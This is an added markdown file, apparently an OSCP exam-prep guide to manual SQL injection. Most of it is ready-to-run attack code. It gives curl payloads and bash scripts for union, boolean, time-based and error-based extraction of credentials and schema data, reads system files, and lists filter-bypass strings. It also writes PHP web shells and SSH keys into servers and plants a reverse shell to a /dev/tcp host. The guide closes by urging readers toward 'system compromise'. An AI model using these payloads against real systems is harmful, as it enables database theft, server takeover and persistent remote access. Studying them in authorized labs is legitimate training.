@@ -1,0 +1,793 @@
+# OSCP Manual SQL Injection Complete Guide - TJ Null Proven Techniques
+
+Based on extensive research from GitHub, OffSec, YouTube, CSDN, Medium, and Reddit across Chinese, English, Hindi, Spanish, and French sources. This guide focuses on manual SQL injection techniques proven effective in TJ Null boxes and OSCP exams.
+
+## Table of Contents
+- [SQL Injection Fundamentals](#sql-injection-fundamentals)
+- [Manual Detection Techniques](#manual-detection-techniques)
+- [Union-Based SQL Injection](#union-based-sql-injection)
+- [Boolean-Based Blind SQL Injection](#boolean-based-blind-sql-injection)
+- [Time-Based Blind SQL Injection](#time-based-blind-sql-injection)
+- [Error-Based SQL Injection](#error-based-sql-injection)
+- [File Operations via SQL](#file-operations-via-sql)
+- [Database-Specific Techniques](#database-specific-techniques)
+- [TJ Null SQLi Patterns](#tj-null-sqli-patterns)
+- [Bypassing Filters](#bypassing-filters)
+
+## SQL Injection Fundamentals
+
+### Understanding SQL Injection
+
+**What is SQL Injection?**
+SQL injection occurs when user input is not properly sanitized and is directly incorporated into SQL queries, allowing attackers to manipulate the query logic and execute arbitrary SQL commands.
+
+**Common Vulnerable Code Patterns:**
+```php
+// PHP - Vulnerable
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+
+// ASP.NET - Vulnerable  
+string query = "SELECT * FROM users WHERE id = " + userInput;
+
+// Python - Vulnerable
+query = "SELECT * FROM products WHERE category = '" + category + "'"
+```
+
+### Basic SQL Injection Concepts
+
+**Understanding SQL Query Structure:**
+```sql
+-- Basic SELECT query
+SELECT column1, column2 FROM table WHERE condition;
+
+-- Example vulnerable query
+SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
+
+-- After injection
+SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'password123';
+```
+
+**Common SQL Operators and Functions:**
+```sql
+-- Logical operators
+AND, OR, NOT
+
+-- Comparison operators  
+=, !=, <>, <, >, <=, >=
+
+-- String functions
+CONCAT(), SUBSTRING(), LENGTH(), UPPER(), LOWER()
+
+-- System functions
+USER(), DATABASE(), VERSION()
+
+-- Comments
+-- (SQL comment)
+# (MySQL comment)
+/* */ (Multi-line comment)
+```
+
+## Manual Detection Techniques
+
+### Phase 1: Basic Detection Methods
+
+**Step 1: Single Quote Testing**
+```bash
+# Test parameter with single quote
+IP=192.168.1.100  # Edit this line only
+curl "http://$IP/page.php?id=1'"
+curl "http://$IP/search.php?query=test'"
+curl "http://$IP/product.php?category=books'"
+
+# Look for error messages indicating SQL injection:
+# - MySQL: "You have an error in your SQL syntax"
+# - PostgreSQL: "ERROR: unterminated quoted string"
+# - MSSQL: "Unclosed quotation mark after the character string"
+# - Oracle: "ORA-00933: SQL command not properly ended"
+```
+
+**Step 2: Logical Testing**
+```bash
+# Boolean logic testing
+curl "http://$IP/page.php?id=1 AND 1=1"      # Should return normal response
+curl "http://$IP/page.php?id=1 AND 1=2"      # Should return different/empty response
+curl "http://$IP/page.php?id=1' AND '1'='1"  # Should return normal response  
+curl "http://$IP/page.php?id=1' AND '1'='2"  # Should return different/empty response
+```
+
+**Step 3: Comment Testing**
+```bash
+# Test different comment styles
+curl "http://$IP/page.php?id=1--"           # SQL comment
+curl "http://$IP/page.php?id=1#"            # MySQL comment  
+curl "http://$IP/page.php?id=1/*"           # Multi-line comment start
+curl "http://$IP/page.php?id=1;%00"         # Null byte injection
+```
+
+### Phase 2: Advanced Detection
+
+**Step 1: Numeric vs String Parameter Testing**
+```bash
+# Numeric parameter testing
+curl "http://$IP/page.php?id=1 AND 1=1"
+curl "http://$IP/page.php?id=1 AND 1=2"
+curl "http://$IP/page.php?id=1+1"           # Should return id=2 if numeric
+curl "http://$IP/page.php?id=1*1"           # Should return id=1 if numeric
+
+# String parameter testing  
+curl "http://$IP/page.php?name=admin' AND 'x'='x"
+curl "http://$IP/page.php?name=admin' AND 'x'='y"
+curl "http://$IP/page.php?name=admin'||'test"
+```
+
+**Step 2: Time-Based Detection**
+```bash
+# MySQL time-based detection
+curl "http://$IP/page.php?id=1 AND SLEEP(5)"           # Should delay 5 seconds
+curl "http://$IP/page.php?id=1' AND SLEEP(5)-- "       # String context
+
+# PostgreSQL time-based detection
+curl "http://$IP/page.php?id=1; SELECT PG_SLEEP(5)-- "
+
+# MSSQL time-based detection  
+curl "http://$IP/page.php?id=1; WAITFOR DELAY '0:0:5'-- "
+
+# Universal time-based (works on most databases)
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) as x) AND SLEEP(5)"
+```
+
+## Union-Based SQL Injection
+
+### Phase 1: Column Count Determination
+
+**Method 1: ORDER BY Technique**
+```bash
+# Determine number of columns using ORDER BY
+IP=192.168.1.100  # Edit this line only
+
+# Test incrementally until error occurs
+curl "http://$IP/page.php?id=1 ORDER BY 1--"     # No error
+curl "http://$IP/page.php?id=1 ORDER BY 2--"     # No error  
+curl "http://$IP/page.php?id=1 ORDER BY 3--"     # No error
+curl "http://$IP/page.php?id=1 ORDER BY 4--"     # Error = 3 columns
+```
+
+**Method 2: UNION SELECT Technique**
+```bash
+# Test different column counts with UNION SELECT
+curl "http://$IP/page.php?id=1 UNION SELECT 1--"         # Error
+curl "http://$IP/page.php?id=1 UNION SELECT 1,2--"       # Error
+curl "http://$IP/page.php?id=1 UNION SELECT 1,2,3--"     # Success = 3 columns
+curl "http://$IP/page.php?id=1 UNION SELECT 1,2,3,4--"   # Error
+```
+
+**Method 3: NULL-Based Detection**
+```bash
+# Use NULL values for compatibility
+curl "http://$IP/page.php?id=1 UNION SELECT NULL--"
+curl "http://$IP/page.php?id=1 UNION SELECT NULL,NULL--"  
+curl "http://$IP/page.php?id=1 UNION SELECT NULL,NULL,NULL--"
+```
+
+### Phase 2: Data Extraction
+
+**Step 1: Database Information Gathering**
+```bash
+# Extract basic database information
+curl "http://$IP/page.php?id=1 UNION SELECT 1,@@version,3--"        # MySQL version
+curl "http://$IP/page.php?id=1 UNION SELECT 1,version(),3--"        # PostgreSQL version
+curl "http://$IP/page.php?id=1 UNION SELECT 1,sqlite_version(),3--" # SQLite version
+
+# Current database name
+curl "http://$IP/page.php?id=1 UNION SELECT 1,database(),3--"       # MySQL
+curl "http://$IP/page.php?id=1 UNION SELECT 1,current_database(),3--" # PostgreSQL
+
+# Current user
+curl "http://$IP/page.php?id=1 UNION SELECT 1,user(),3--"          # MySQL
+curl "http://$IP/page.php?id=1 UNION SELECT 1,current_user,3--"    # PostgreSQL
+```
+
+**Step 2: Schema Enumeration**
+```bash
+# List all databases (MySQL)
+curl "http://$IP/page.php?id=1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--"
+
+# List all tables in current database (MySQL)
+curl "http://$IP/page.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
+
+# List all columns from specific table (MySQL)
+curl "http://$IP/page.php?id=1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
+
+# PostgreSQL schema enumeration
+curl "http://$IP/page.php?id=1 UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'--"
+```
+
+**Step 3: Data Extraction**
+```bash
+# Extract data from target table
+curl "http://$IP/page.php?id=1 UNION SELECT 1,group_concat(username,':',password),3 FROM users--"
+
+# Extract specific user data
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users WHERE username='admin'--"
+
+# Extract multiple records
+curl "http://$IP/page.php?id=1 UNION SELECT 1,group_concat(concat(id,':',username,':',email) SEPARATOR '<br>'),3 FROM users--"
+```
+
+### Phase 3: Advanced Union Techniques
+
+**Step 1: Data Type Conversion**
+```bash
+# Handle different data types
+curl "http://$IP/page.php?id=1 UNION SELECT 1,CAST(user_id AS CHAR),3 FROM users--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,CONVERT(user_id, CHAR),3 FROM users--"
+
+# Concatenate different data types
+curl "http://$IP/page.php?id=1 UNION SELECT 1,CONCAT('User: ',username,' ID: ',CAST(id AS CHAR)),3 FROM users--"
+```
+
+**Step 2: Limiting Results**
+```bash
+# Extract data one record at a time
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users LIMIT 0,1--"  # First record
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users LIMIT 1,1--"  # Second record
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users LIMIT 2,1--"  # Third record
+
+# Alternative LIMIT syntax
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users LIMIT 1 OFFSET 0--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,username,password FROM users LIMIT 1 OFFSET 1--"
+```
+
+## Boolean-Based Blind SQL Injection
+
+### Phase 1: Basic Boolean Testing
+
+**Step 1: True/False Response Identification**
+```bash
+# Establish baseline responses
+IP=192.168.1.100  # Edit this line only
+
+# True condition - note response length/content
+true_response=$(curl -s "http://$IP/page.php?id=1 AND 1=1")
+echo "True response length: ${#true_response}"
+
+# False condition - note different response
+false_response=$(curl -s "http://$IP/page.php?id=1 AND 1=2")
+echo "False response length: ${#false_response}"
+
+# Verify different responses
+if [ "$true_response" != "$false_response" ]; then
+    echo "Boolean-based SQL injection likely present!"
+fi
+```
+
+**Step 2: Database Information Extraction**
+```bash
+# Extract database version character by character
+# Test if first character of version is 'M' (MySQL)
+curl "http://$IP/page.php?id=1 AND SUBSTRING(@@version,1,1)='M'"
+
+# Test if first character is '5'
+curl "http://$IP/page.php?id=1 AND SUBSTRING(@@version,1,1)='5'"
+
+# Automated character extraction script
+for i in {1..20}; do
+    for char in {A..Z} {a..z} {0..9} '.' '-' '_'; do
+        response=$(curl -s "http://$IP/page.php?id=1 AND SUBSTRING(@@version,$i,1)='$char'")
+        if [ ${#response} -eq ${#true_response} ]; then
+            echo -n "$char"
+            break
+        fi
+    done
+done
+echo ""
+```
+
+### Phase 2: Advanced Boolean Techniques
+
+**Step 1: Database Name Extraction**
+```bash
+# Extract current database name length
+for length in {1..20}; do
+    response=$(curl -s "http://$IP/page.php?id=1 AND LENGTH(database())=$length")
+    if [ ${#response} -eq ${#true_response} ]; then
+        echo "Database name length: $length"
+        break
+    fi
+done
+
+# Extract database name character by character
+db_length=8  # Use the length found above
+for i in $(seq 1 $db_length); do
+    for char in {a..z} {A..Z} {0..9} '_'; do
+        response=$(curl -s "http://$IP/page.php?id=1 AND SUBSTRING(database(),$i,1)='$char'")
+        if [ ${#response} -eq ${#true_response} ]; then
+            echo -n "$char"
+            break
+        fi
+    done
+done
+echo ""
+```
+
+**Step 2: Table and Column Discovery**
+```bash
+# Check if specific table exists
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM users)>0"
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM admin)>0"
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM accounts)>0"
+
+# Extract first table name from information_schema
+curl "http://$IP/page.php?id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'"
+
+# Check if specific column exists in table
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(username) FROM users)>0"
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(password) FROM users)>0"
+```
+
+## Time-Based Blind SQL Injection
+
+### Phase 1: Basic Time-Based Testing
+
+**Step 1: Time Delay Detection**
+```bash
+# MySQL time-based injection
+IP=192.168.1.100  # Edit this line only
+
+# Test basic time delay
+start_time=$(date +%s)
+curl "http://$IP/page.php?id=1 AND SLEEP(5)"
+end_time=$(date +%s)
+delay=$((end_time - start_time))
+echo "Response delay: $delay seconds"
+
+# String context time delay
+curl "http://$IP/page.php?id=1' AND SLEEP(5)-- "
+
+# Conditional time delay
+curl "http://$IP/page.php?id=1 AND IF(1=1,SLEEP(5),0)"
+curl "http://$IP/page.php?id=1 AND IF(1=2,SLEEP(5),0)"
+```
+
+**Step 2: Database-Specific Time Delays**
+```bash
+# PostgreSQL time delays
+curl "http://$IP/page.php?id=1; SELECT pg_sleep(5)-- "
+curl "http://$IP/page.php?id=1' AND 1=(SELECT pg_sleep(5))-- "
+
+# MSSQL time delays  
+curl "http://$IP/page.php?id=1; WAITFOR DELAY '0:0:5'-- "
+curl "http://$IP/page.php?id=1'; IF(1=1) WAITFOR DELAY '0:0:5'-- "
+
+# Oracle time delays
+curl "http://$IP/page.php?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1"
+
+# SQLite time delays (less reliable)
+curl "http://$IP/page.php?id=1 AND randomblob(100000000)"
+```
+
+### Phase 2: Information Extraction with Time-Based
+
+**Step 1: Character-by-Character Extraction**
+```bash
+# Extract database version using time-based
+for i in {1..20}; do
+    for char_code in {32..126}; do
+        char=$(printf "\\$(printf '%03o' $char_code)")
+        start_time=$(date +%s.%N)
+        curl -s "http://$IP/page.php?id=1 AND IF(ASCII(SUBSTRING(@@version,$i,1))=$char_code,SLEEP(3),0)"
+        end_time=$(date +%s.%N)
+        delay=$(echo "$end_time - $start_time" | bc)
+        
+        if (( $(echo "$delay > 2.5" | bc -l) )); then
+            echo -n "$char"
+            break
+        fi
+    done
+done
+echo ""
+```
+
+**Step 2: Advanced Time-Based Extraction**
+```bash
+# Binary search for faster extraction
+extract_char_binary() {
+    local position=$1
+    local low=32
+    local high=126
+    
+    while [ $low -le $high ]; do
+        local mid=$(( (low + high) / 2 ))
+        start_time=$(date +%s.%N)
+        curl -s "http://$IP/page.php?id=1 AND IF(ASCII(SUBSTRING(@@version,$position,1))>$mid,SLEEP(2),0)"
+        end_time=$(date +%s.%N)
+        delay=$(echo "$end_time - $start_time" | bc)
+        
+        if (( $(echo "$delay > 1.5" | bc -l) )); then
+            low=$((mid + 1))
+        else
+            high=$((mid - 1))
+        fi
+    done
+    
+    printf "\\$(printf '%03o' $high)"
+}
+
+# Extract version using binary search
+for i in {1..20}; do
+    char=$(extract_char_binary $i)
+    echo -n "$char"
+done
+echo ""
+```
+
+## Error-Based SQL Injection
+
+### Phase 1: MySQL Error-Based Techniques
+
+**Step 1: Double Query Error-Based**
+```bash
+# Extract database information using double query
+IP=192.168.1.100  # Edit this line only
+
+# Extract current database name
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT database()),FLOOR(RAND(0)*2)))"
+
+# Extract version information
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT @@version),FLOOR(RAND(0)*2)))"
+
+# Extract table names
+curl "http://$IP/page.php?id=1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2)))"
+```
+
+**Step 2: UpdateXML Error-Based**
+```bash
+# Extract database information using updatexml
+curl "http://$IP/page.php?id=1 AND updatexml(null,concat(0x0a,@@version,0x0a),null)"
+curl "http://$IP/page.php?id=1 AND updatexml(null,concat(0x0a,database(),0x0a),null)"
+
+# Extract user data
+curl "http://$IP/page.php?id=1 AND updatexml(null,concat(0x0a,(SELECT group_concat(username,':',password) FROM users),0x0a),null)"
+
+# Extract table names
+curl "http://$IP/page.php?id=1 AND updatexml(null,concat(0x0a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x0a),null)"
+```
+
+**Step 3: ExtractValue Error-Based**
+```bash
+# Similar to updatexml but using extractvalue
+curl "http://$IP/page.php?id=1 AND extractvalue(null,concat(0x0a,@@version,0x0a))"
+curl "http://$IP/page.php?id=1 AND extractvalue(null,concat(0x0a,database(),0x0a))"
+curl "http://$IP/page.php?id=1 AND extractvalue(null,concat(0x0a,(SELECT group_concat(username,':',password) FROM users),0x0a))"
+```
+
+### Phase 2: Other Database Error-Based Techniques
+
+**Step 1: PostgreSQL Error-Based**
+```bash
+# Cast-based errors in PostgreSQL
+curl "http://$IP/page.php?id=1 AND CAST((SELECT version()) AS int)"
+curl "http://$IP/page.php?id=1 AND CAST((SELECT current_database()) AS int)"
+curl "http://$IP/page.php?id=1 AND CAST((SELECT string_agg(usename,',') FROM pg_user) AS int)"
+```
+
+**Step 2: MSSQL Error-Based**
+```bash
+# Convert-based errors in MSSQL
+curl "http://$IP/page.php?id=1 AND CONVERT(int,@@version)"
+curl "http://$IP/page.php?id=1 AND CONVERT(int,db_name())"
+curl "http://$IP/page.php?id=1 AND CONVERT(int,(SELECT TOP 1 name FROM sys.databases))"
+```
+
+## File Operations via SQL
+
+### Phase 1: File Reading Operations
+
+**Step 1: MySQL File Reading**
+```bash
+# Read system files using LOAD_FILE
+IP=192.168.1.100  # Edit this line only
+
+# Linux files
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('/etc/passwd'),3--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('/etc/hosts'),3--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('/var/www/html/config.php'),3--"
+
+# Windows files
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('C:\\windows\\system32\\drivers\\etc\\hosts'),3--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('C:\\inetpub\\wwwroot\\web.config'),3--"
+
+# Web application files
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('/var/www/html/index.php'),3--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,load_file('/var/log/apache2/access.log'),3--"
+```
+
+**Step 2: PostgreSQL File Reading**
+```bash
+# PostgreSQL file reading (requires superuser privileges)
+curl "http://$IP/page.php?id=1 UNION SELECT 1,pg_read_file('/etc/passwd'),3--"
+curl "http://$IP/page.php?id=1 UNION SELECT 1,pg_read_file('/var/www/html/config.php'),3--"
+```
+
+### Phase 2: File Writing Operations
+
+**Step 1: MySQL File Writing**
+```bash
+# Write web shell to web directory
+curl "http://$IP/page.php?id=1 UNION SELECT 1,'<?php system(\$_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--"
+
+# Alternative web shell locations
+webdirs=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt/lampp/htdocs")
+for dir in "${webdirs[@]}"; do
+    curl "http://$IP/page.php?id=1 UNION SELECT 1,'<?php system(\$_GET[\"c\"]); ?>',3 INTO OUTFILE '$dir/cmd.php'--"
+done
+
+# Write SSH keys (if SSH is accessible)
+curl "http://$IP/page.php?id=1 UNION SELECT 1,'ssh-rsa AAAA... your_public_key',3 INTO OUTFILE '/home/user/.ssh/authorized_keys'--"
+```
+
+**Step 2: Advanced File Writing**
+```bash
+# Write more complex web shell
+webshell='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; } ?>'
+curl "http://$IP/page.php?id=1 UNION SELECT 1,'$webshell',3 INTO OUTFILE '/var/www/html/shell.php'--"
+
+# Write reverse shell script
+reverse_shell='<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\''"); ?>'
+curl "http://$IP/page.php?id=1 UNION SELECT 1,'$reverse_shell',3 INTO OUTFILE '/var/www/html/rev.php'--"
+```
+
+**Step 3: Testing Written Files**
+```bash
+# Test written web shells
+curl "http://$IP/shell.php?cmd=whoami"
+curl "http://$IP/shell.php?cmd=id"
+curl "http://$IP/shell.php?c=pwd"
+
+# Test reverse shell (start listener first: nc -lnvp 4444)
+curl "http://$IP/rev.php"
+```
+
+## Database-Specific Techniques
+
+### MySQL Specific Functions
+
+```sql
+-- Version information
+@@version, VERSION()
+
+-- Database information  
+DATABASE(), SCHEMA()
+
+-- User information
+USER(), CURRENT_USER(), SESSION_USER()
+
+-- File operations
+LOAD_FILE('/path/to/file')
+INTO OUTFILE '/path/to/file'
+INTO DUMPFILE '/path/to/file'
+
+-- String functions
+CONCAT(str1, str2, ...)
+GROUP_CONCAT(column SEPARATOR 'sep')
+SUBSTRING(str, pos, len)
+LENGTH(str), CHAR_LENGTH(str)
+
+-- Conditional functions
+IF(condition, true_value, false_value)
+
+-- Time functions
+SLEEP(duration)
+NOW(), CURDATE(), CURTIME()
+```
+
+### PostgreSQL Specific Functions
+
+```sql
+-- Version information
+VERSION()
+
+-- Database information
+CURRENT_DATABASE()
+
+-- User information  
+CURRENT_USER, USER
+SESSION_USER
+
+-- File operations (requires superuser)
+pg_read_file('/path/to/file')
+pg_ls_dir('/path/to/directory')
+
+-- String functions
+STRING_AGG(column, 'separator')
+SUBSTR(str, pos, len)
+LENGTH(str)
+
+-- Conditional functions
+CASE WHEN condition THEN value ELSE value END
+
+-- Time functions
+pg_sleep(duration)
+NOW(), CURRENT_DATE, CURRENT_TIME
+```
+
+### MSSQL Specific Functions
+
+```sql
+-- Version information
+@@VERSION
+
+-- Database information
+DB_NAME(), DB_ID()
+
+-- User information
+USER_NAME(), SUSER_NAME()
+CURRENT_USER, SESSION_USER
+
+-- File operations (xp_cmdshell required)
+BULK INSERT table FROM 'file'
+
+-- String functions  
+CONCAT(str1, str2, ...)
+SUBSTRING(str, pos, len)
+LEN(str), DATALENGTH(str)
+
+-- Conditional functions
+IIF(condition, true_value, false_value)
+
+-- Time functions
+WAITFOR DELAY 'time'
+GETDATE(), GETUTCDATE()
+```
+
+## TJ Null SQLi Patterns
+
+### Common TJ Null Box SQL Injection Scenarios
+
+**Pattern 1: Login Bypass to Admin Panel**
+1. Login form with SQL injection vulnerability
+2. Basic bypass: `admin' or '1'='1'-- `
+3. Access to admin panel with elevated privileges
+4. File upload or command execution functionality
+
+**Pattern 2: Search Function SQL Injection**
+1. Search functionality with injectable parameter
+2. Union-based injection to extract database
+3. File write capabilities to web directory
+4. Web shell execution for initial access
+
+**Pattern 3: Product/Item Display SQL Injection**
+1. Product display page with ?id= parameter
+2. Error-based or Union-based data extraction
+3. Database credentials or file paths revealed
+4. Credential reuse or file inclusion attacks
+
+### TJ Null Difficulty Recognition
+
+**Easy SQL Injection Indicators:**
+- Clear error messages revealing database type
+- Simple single-quote injection works immediately
+- Standard Union SELECT injection successful
+- Basic file read/write operations available
+
+**Medium SQL Injection Indicators:**
+- Blind SQL injection techniques required
+- Basic filtering that needs simple bypasses
+- Multiple injection points need testing
+- File operations require path discovery
+
+**Hard SQL Injection Indicators:**
+- Advanced filtering and WAF bypass needed
+- Second-order SQL injection scenarios
+- Complex blind injection with minimal feedback
+- Custom application logic vulnerabilities
+
+## Bypassing Filters
+
+### Common Filter Bypasses
+
+**Step 1: Space Filter Bypasses**
+```sql
+-- Replace spaces with other characters
+'/**/OR/**/1=1
+'+OR+1=1
+'||OR||1=1  
+'%20OR%201=1
+'%09OR%091=1  -- Tab character
+'%0aOR%0a1=1  -- New line
+'%0cOR%0c1=1  -- Form feed
+'%0dOR%0d1=1  -- Carriage return
+
+-- Parentheses bypass
+'OR(1)=(1)
+'OR'1'='1
+'OR(1=1)
+```
+
+**Step 2: Quote Filter Bypasses**  
+```sql
+-- Use double quotes instead of single
+"OR"1"="1
+
+-- Use backslash escaping
+\'OR\'1\'=\'1
+
+-- Use hex encoding
+'OR 1=1#
+0x4f522031223d31  -- Hex for 'OR 1=1
+
+-- Use CHAR function
+'OR CHAR(49)=CHAR(49)  -- '1'='1'
+'OR ASCII('1')=ASCII('1')
+```
+
+**Step 3: Keyword Filter Bypasses**
+```sql
+-- Case variations
+'Or 1=1
+'oR 1=1  
+'OR 1=1
+'UnIoN sElEcT
+
+-- Comments within keywords
+'UN/**/ION SE/**/LECT
+'OR/*comment*/1=1
+
+-- Alternative keywords
+'|| 1=1  -- Instead of OR
+'AND 1 GROUP BY password HAVING 1=1--  -- Instead of UNION
+```
+
+**Step 4: Length Limitation Bypasses**
+```sql
+-- Shorter payloads
+'||1#
+'OR 1#  
+1'OR'1'='1
+1'||'1'='1
+
+-- Alias usage
+'UNION(SELECT(1))#
+'UNION SELECT 1,2,3#
+'UNION ALL SELECT 1,2,3#
+```
+
+### Advanced Filter Evasion
+
+**Step 1: Encoding Bypasses**
+```bash
+# URL encoding
+curl "http://$IP/page.php?id=1%27%20OR%20%271%27%3D%271"
+
+# Double URL encoding  
+curl "http://$IP/page.php?id=1%2527%2520OR%2520%25271%2527%253D%25271"
+
+# HTML entity encoding
+curl "http://$IP/page.php?id=1&#x27; OR &#x27;1&#x27;=&#x27;1"
+
+# Unicode encoding
+curl "http://$IP/page.php?id=1\u0027 OR \u00271\u0027=\u00271"
+```
+
+**Step 2: Alternative Syntax**
+```sql
+-- MySQL alternative operators
+'OR 1 LIKE 1
+'OR 1 RLIKE 1  
+'OR 1 REGEXP 1
+'OR 1 DIV 1
+'OR 1 MOD 1
+
+-- Bitwise operations
+'OR 1&1
+'OR 1|1
+'OR 1^0
+
+-- Mathematical operations  
+'OR 1*1
+'OR 2-1
+'OR 2/2
+'OR 1+0
+```
+
+Remember: Manual SQL injection is a critical OSCP skill. Practice these techniques systematically, understand the underlying concepts, and always test multiple approaches. The goal is not just to find injection, but to extract useful data that leads to system compromise!
